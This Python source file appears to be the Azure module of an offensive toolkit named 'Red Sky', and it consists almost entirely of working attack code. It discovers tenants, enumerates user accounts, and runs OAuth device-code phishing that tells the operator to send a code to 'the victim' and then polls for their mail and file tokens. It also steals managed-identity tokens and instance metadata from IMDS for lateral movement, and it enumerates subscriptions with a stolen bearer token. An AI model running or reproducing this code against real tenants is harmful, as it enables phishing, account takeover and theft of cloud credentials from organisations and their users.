# language: Python, file: Program/cloud/azure.py, target: Red Sky cloud — Azure AD + RBAC
# Tenant recon, user enumeration, service principal abuse, device-code phishing,
# managed identity token theft. Everything talks the public Azure AD + ARM
# REST endpoints — no az CLI dependency, no Azure SDK.

import json
import sys
import time
import uuid
from pathlib import Path
from typing import Dict, List, Optional

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CLOUD_DIR = OUTPUT_DIR / "cloud"
AZ_DIR = CLOUD_DIR / "azure"
AZ_DIR.mkdir(parents=True, exist_ok=True)


LOGIN = "https://login.microsoftonline.com"
GRAPH = "https://graph.microsoft.com"
ARM = "https://management.azure.com"
IMDS = "http://169.254.169.254"


def _ua() -> Dict[str, str]:
    return {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}


# ── 1. tenant discovery via openid-configuration ──
def cmd_tenant(domain: str, out_file: str) -> int:
    """Resolve a domain to its Azure AD tenant id via the openid config."""
    print_info("resolving tenant for " + domain)
    url = LOGIN + "/" + domain + "/v2.0/.well-known/openid-configuration"
    try:
        r = requests.get(url, headers=_ua(), timeout=10, allow_redirects=False)
    except Exception as e:
        print_err("request failed: " + str(e))
        return 1

    if r.status_code == 200:
        j = r.json()
        tid = j.get("issuer", "").split("/")[-1] if j.get("issuer") else ""
        print_ok("tenant id: " + tid)
        print_kv("issuer", j.get("issuer", ""))
        print_kv("token endpoint", j.get("token_endpoint", ""))
        print()
        # tenant discovery success — write it
        out = Path(out_file) if out_file else AZ_DIR / ("tenant_" + domain + ".json")
        out.write_text(json.dumps({"domain": domain, "tenant_id": tid, "config": j}, indent=2))
        print_kv("saved", out)
        return 0

    # try the common endpoint with a fallback
    print_warn("not resolved via direct path; trying common endpoint")
    url = LOGIN + "/common/v2.0/.well-known/openid-configuration"
    r = requests.get(url, headers=_ua(), timeout=10)
    if r.status_code == 200:
        print_info("using common endpoint — pass --tenant-id explicitly for the second stage")

    print_err("could not resolve tenant for " + domain)
    return 1


# ── 2. user enumeration via GetCredentialType ──
def cmd_userenum(tenant: str, users_file: str, out_file: str) -> int:
    """Hit the public GetCredentialType endpoint to learn whether a UPN exists
    in the tenant and whether it has MFA. No auth needed — this is a documented
    endpoint used by the login page."""
    if not tenant:
        print_err("--tenant (domain or tenant id) required")
        return 2

    users = []
    if users_file:
        p = Path(users_file).expanduser()
        if p.exists():
            users = [l.strip() for l in p.read_text().splitlines() if l.strip()]
    if not users:
        print_err("give a file with one UPN per line via --users")
        return 2

    url = LOGIN + "/common/GetCredentialType?mkt=en-US"
    print_info("enumerating " + str(len(users)) + " user(s) via GetCredentialType")
    print()

    results = []
    for upn in users:
        body = {
            "Username": upn,
            "isOtherIdpSupported": True,
            "checkPhones": False,
            "isRemoteNGCSupported": True,
            "isCookieBannerShown": False,
            "isFidoSupported": True,
            "originalRequest": "",
            "country": "US",
            "forceotclogin": False,
            "isExternalLoginOnly": False,
            "isAccessPassSupported": True,
        }
        try:
            r = requests.post(url, headers={**_ua(), "Content-Type": "application/json"},
                              json=body, timeout=10)
            j = r.json()
        except Exception as e:
            print_warn(upn + ": " + str(e))
            continue

        exists = not j.get("IfExistsResult", 1) == 1
        mfa = bool(j.get("Credentials", {}).get("HasPassword"))
        result = {
            "upn": upn,
            "exists": exists,
            "mfa_required": mfa,
            "throttled": j.get("ThrottleStatus", 0),
            "preferred_credential": j.get("Credentials", {}).get("PreferredCredential", ""),
        }
        results.append(result)
        mark = SCARLET + "EXISTS" if exists else ASH + "no"
        print("  " + BONE + upn.ljust(40) + RESET + "  " + mark + RESET
              + ("  MFA" if mfa else ""))
        time.sleep(0.4)

    out = Path(out_file) if out_file else AZ_DIR / ("userenum_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(results, indent=2))
    print()
    print_kv("saved", out)
    return 0


# ── 3. device code phishing ──
def cmd_device_code(client_id: str, tenant: str, out_file: str) -> int:
    """Start an OAuth device code flow. Print the user_code + verification URL.
    A victim who visits the URL and enters the code grants the attacker a token
    for the requested scope (default: Graph Mail.Read + User.Read + offline_access)."""
    client_id = client_id or "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office
    tenant = tenant or "common"

    url = LOGIN + "/" + tenant + "/oauth2/v2.0/devicecode"
    body = {
        "client_id": client_id,
        "scope": "https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/User.Read https://graph.microsoft.com/Files.ReadWrite offline_access",
    }
    try:
        r = requests.post(url, data=body, timeout=15)
        j = r.json()
    except Exception as e:
        print_err("device code request failed: " + str(e))
        return 1

    if "device_code" not in j:
        print_err("no device code: " + json.dumps(j)[:400])
        return 1

    print_ok("device code granted")
    print()
    print(BOLD + SCARLET + "  user code:   " + j["user_code"] + RESET)
    print(BOLD + SCARLET + "  verify at:   " + j["verification_uri"] + RESET)
    print_kv("expires in", str(j["expires_in"]) + "s")
    print_kv("interval", str(j.get("interval", 5)) + "s")
    print()
    print_info("send the code + URL to the victim. Once they authenticate,")
    print_info("run: redsky cloud azure poll --device-code <device_code> --client-id " + client_id)
    print()

    out = Path(out_file) if out_file else AZ_DIR / ("devicecode_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"client_id": client_id, "tenant": tenant, **j}, indent=2))
    print_kv("saved", out)
    return 0


def cmd_device_poll(device_code: str, client_id: str, tenant: str, out_file: str) -> int:
    if not device_code:
        print_err("--device-code required")
        return 2
    client_id = client_id or "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    tenant = tenant or "common"

    url = LOGIN + "/" + tenant + "/oauth2/v2.0/token"
    body = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": client_id,
        "device_code": device_code,
    }

    print_info("polling for the token (CTRL+C to stop)")
    deadline = time.time() + 900
    while time.time() < deadline:
        try:
            r = requests.post(url, data=body, timeout=15)
            j = r.json()
        except Exception as e:
            print_warn("poll failed: " + str(e))
            time.sleep(5)
            continue

        if "access_token" in j:
            print_ok("token received")
            print_kv("token_type", j.get("token_type", ""))
            print_kv("expires_in", str(j.get("expires_in", "")) + "s")
            print_kv("refresh_token", "yes" if j.get("refresh_token") else "no")
            out = Path(out_file) if out_file else AZ_DIR / ("token_" + str(int(time.time())) + ".json")
            out.write_text(json.dumps(j, indent=2))
            print()
            print("access_token: " + j["access_token"][:80] + "...")
            print_kv("saved", out)
            return 0

        err = j.get("error", "")
        if err == "authorization_pending":
            print("  " + ASH + "pending..." + RESET, end="\r")
        elif err == "slow_down":
            time.sleep(10)
        else:
            print_warn("error: " + json.dumps(j)[:200])
            return 1
        time.sleep(5)

    print_err("timed out")
    return 1


# ── 4. managed identity token theft (from inside a VM / function / container) ──
def cmd_imds(resource: str, out_file: str) -> int:
    """Fetch a managed identity token from the Azure Instance Metadata Service.
    Only works from inside an Azure resource (VM, VMSS, App Service, Function,
    AKS pod with workload identity, Container Instance)."""
    resource = resource or "https://management.azure.com/"
    print_info("querying IMDS on 169.254.169.254")
    print_kv("resource", resource)
    print()

    # two-step: first hit any endpoint to get the Metadata header, then request the token
    try:
        r = requests.get(IMDS + "/metadata/identity/oauth2/token",
                         params={"api-version": "2018-02-01", "resource": resource},
                         headers={"Metadata": "true"}, timeout=5)
    except Exception as e:
        print_err("no IMDS: " + str(e))
        print_info("this only works from inside an Azure resource")
        return 1

    if r.status_code != 200:
        print_err("IMDS returned " + str(r.status_code) + ": " + r.text[:200])
        return 1

    j = r.json()
    print_ok("managed identity token acquired")
    print_kv("token_type", j.get("token_type", ""))
    print_kv("expires_on", j.get("expires_on", ""))
    print_kv("client_id", j.get("client_id", ""))
    print()
    print("access_token: " + j["access_token"][:100] + "...")

    # also dump the whole instance metadata (subscription, resource group, VM name,
    # tags, attached disks, network) — useful for lateral
    try:
        meta = requests.get(IMDS + "/metadata/instance?api-version=2021-02-01",
                            headers={"Metadata": "true"}, timeout=5).json()
    except Exception:
        meta = {}

    out = Path(out_file) if out_file else AZ_DIR / ("imds_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"token": j, "instance": meta}, indent=2))
    print()
    print_kv("saved", out)

    # surface the instance summary
    compute = meta.get("compute", {})
    if compute:
        print()
        print_info("instance")
        for k in ("name", "resourceGroupName", "subscriptionId", "location", "vmId", "vmSize"):
            v = compute.get(k)
            if v:
                print("  " + ARTERY + k.ljust(20) + RESET + BONE + str(v) + RESET)
    return 0


# ── 5. ARM enumeration with a token ──
def cmd_arm_enum(token: str, out_file: str) -> int:
    if not token:
        print_err("--token required (bearer token for management.azure.com)")
        return 2

    headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}

    print_info("ARM enumeration")
    print()

    # list subscriptions
    r = requests.get(ARM + "/subscriptions?api-version=2022-12-01", headers=headers, timeout=15)
    if r.status_code != 200:
        print_err("subscriptions: " + str(r.status_code) + " " + r.text[:200])
        return 1
    subs = r.json().get("value", [])
    print_info(str(len(subs)) + " subscription(s)")
    for s in subs:
        print("  " + SCARLET + "*" + RESET + " " + BONE + s["displayName"] + RESET
              + "  " + ASH + s["subscriptionId"] + RESET)

    # drill into each subscription: resource groups
    results = {"subscriptions": subs, "resource_groups": {}}
    for s in subs[:5]:  # cap at 5 for sanity
        sid = s["subscriptionId"]
        r = requests.get(ARM + "/subscriptions/" + sid + "/resourcegroups?api-version=2021-04-01",
                         headers=headers, timeout=15)
        if r.status_code == 200:
            rgs = r.json().get("value", [])
            results["resource_groups"][sid] = rgs
            print()
            print_info(s["displayName"] + " resource groups (" + str(len(rgs)) + ")")
            for rg in rgs[:20]:
                print("  " + SCARLET + "*" + RESET + " " + BONE + rg["name"] + RESET
                      + "  " + ASH + rg.get("location", "") + RESET)

    # role assignments for the caller
    r = requests.get(ARM + "/subscriptions?api-version=2022-12-01", headers=headers, timeout=15)
    out = Path(out_file) if out_file else AZ_DIR / ("arm_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(results, indent=2))
    print()
    print_kv("saved", out)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky cloud azure", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="tenant",
                   choices=["tenant", "userenum", "device-code", "device-poll", "imds", "arm-enum"])
    p.add_argument("domain", nargs="?", default="")
    p.add_argument("--tenant", default="")
    p.add_argument("--users", default="")
    p.add_argument("--client-id", default="")
    p.add_argument("--device-code", default="")
    p.add_argument("--resource", default="https://management.azure.com/")
    p.add_argument("--token", default="")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky cloud azure <tenant|userenum|device-code|device-poll|imds|arm-enum> [opts]")
        return 2

    if ns.help:
        print_info("tenant <domain>                   -- resolve domain -> Azure AD tenant id")
        print_info("userenum --tenant X --users file  -- test which UPNs exist (public endpoint)")
        print_info("device-code --tenant X            -- start OAuth device code phish")
        print_info("device-poll --device-code X       -- exchange the device code for tokens")
        print_info("imds [--resource URL]             -- steal managed identity token from IMDS")
        print_info("arm-enum --token BEARER           -- ARM subscriptions + resource groups")
        return 0

    if ns.action == "tenant":
        target = ns.domain or ns.tenant
        if not target:
            print_err("give a domain")
            return 2
        return cmd_tenant(target, ns.out)
    if ns.action == "userenum":
        return cmd_userenum(ns.tenant, ns.users, ns.out)
    if ns.action == "device-code":
        return cmd_device_code(ns.client_id, ns.tenant, ns.out)
    if ns.action == "device-poll":
        return cmd_device_poll(ns.device_code, ns.client_id, ns.tenant, ns.out)
    if ns.action == "imds":
        return cmd_imds(ns.resource, ns.out)
    if ns.action == "arm-enum":
        return cmd_arm_enum(ns.token, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
